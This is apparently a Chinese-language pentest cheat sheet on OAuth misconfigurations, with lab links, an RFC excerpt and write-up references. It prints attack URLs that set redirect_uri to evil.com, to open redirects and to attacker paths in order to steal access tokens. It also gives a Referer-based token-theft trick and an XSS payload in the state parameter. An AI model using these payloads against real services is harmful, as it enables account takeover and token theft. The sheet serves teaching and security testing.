# OAuth配置错误

## 摘要

- [实验室](#labs)
- [通过引用窃取OAuth令牌](#stealing-oauth-token-via-referer)
- [通过redirect_uri获取OAuth令牌](#grabbing-oauth-token-via-redirect---uri)
- [通过redirect_uri执行XSS](#executing-xss-via-redirect---uri)
- [OAuth私钥泄露](#oauth-private-key-disclosure)
- [授权码规则违规](#authorization-code-rule-violation)
- [跨站请求伪造](#cross-site-request-forgery)
- [参考资料](#references)


## 实验室

* [PortSwigger - 通过OAuth隐式流绕过身份验证](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
* [PortSwigger - 强制OAuth个人资料链接](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
* [PortSwigger - 通过redirect_uri劫持OAuth账户](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
* [PortSwigger - 通过代理页面窃取OAuth访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
* [PortSwigger - 通过开放重定向窃取OAuth访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)


## 通过引用窃取OAuth令牌

来自[@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)的推文。

> 你有HTML注入，但是无法得到XSS吗？站点上有OAuth实现吗？如果有，设置一个指向你自己服务器的img标签，看看是否在登录后有办法（重定向等）让受害者到达那里，以通过引用窃取OAuth令牌。


## 通过redirect_uri获取OAuth令牌

重定向到受控域以获取访问令牌

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

重定向到一个接受的Open URL以获取访问令牌

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth实现永远不应该白名单整个域，只应白名单少数URL，以便“redirect_uri”不能指向开放重定向。

有时你需要将范围更改为无效值以绕过对redirect_uri的过滤：

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```


## 通过redirect_uri执行XSS

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```


## OAuth私钥泄露

一些Android/iOS应用程序可以被反编译，OAuth私钥可以被访问。


## 授权码规则违规

> 客户端不得使用授权码超过一次。  
> 如果授权码被使用超过一次，授权服务器必须拒绝该请求  
> 并应在可能的情况下撤销基于该授权码之前发出的所有令牌。


## 跨站请求伪造

不检查OAuth回调中有效CSRF令牌的应用程序容易受到攻击。这可以通过初始化OAuth流程并拦截回调（`https://example.com/callback?code=AUTHORIZATION_CODE`）来利用。这个URL可以用于CSRF攻击。

> 客户端必须为其重定向URI实施CSRF保护。这通常是通过要求发送到重定向URI端点的任何请求都包括一个将请求绑定到用户代理的已验证状态的值来实现的。客户端在向授权服务器发起授权请求时，应使用“state”请求参数将此值传递给授权服务器。


## 参考资料

* [所有Paypal OAuth令牌都属于我 - 本地主机获胜 - 进入对称性](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html)
* [OAuth 2 - 我如何再次黑进Facebook（..并且本可以窃取有效的访问令牌）- 进入对称性](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
* [我如何再次黑进Github - Egor Homakov](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
* [微软如何把你的数据交给Facebook…以及所有人 - Andris Atteka](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)

- [绕过Periscope管理面板上的Google身份验证](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/) 作者Jack Whitton